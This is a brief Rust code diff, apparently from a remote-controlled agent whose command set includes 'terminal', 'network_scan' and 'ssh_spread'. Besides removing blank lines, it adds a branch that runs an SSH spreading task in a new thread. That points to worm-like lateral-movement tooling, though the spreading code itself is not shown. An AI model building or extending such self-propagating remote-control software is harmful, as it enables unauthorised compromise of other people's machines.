@@ -26,7 +26,6 @@ pub use crate::tasks::network_scan::{
 };
 use crate::tasks::ssh_spread::ssh_spread;
 
-
 const TERMINAL_CMD: &'static str = "terminal";
 const ABORT_CMD: &'static str = "abort";
 const NETWORK_SCAN_CMD: &'static str = "network_scan";
@@ -34,7 +33,6 @@ const SSH_SPREAD: &'static str = "ssh_spread";
 const DEFAULT_MIN_WAIT: u32 = 0;
 const DEFAULT_MAX_WAIT: u32 = 500;
 const ABORTED_STATUS_CODE: i32 = -3;
-
 
 
 lazy_static! {
@@ -267,6 +265,11 @@ pub fn run_task(task: Task) {
                     &RUNNING_TASKS,
                     task.id,
                     task.data);
+            });
+        }
+        SSH_SPREAD => {
+            thread::spawn(|| {
+                ssh_spread(&RUNNING_TASKS, task.id, task.data);
             });
         }
         _ => {}
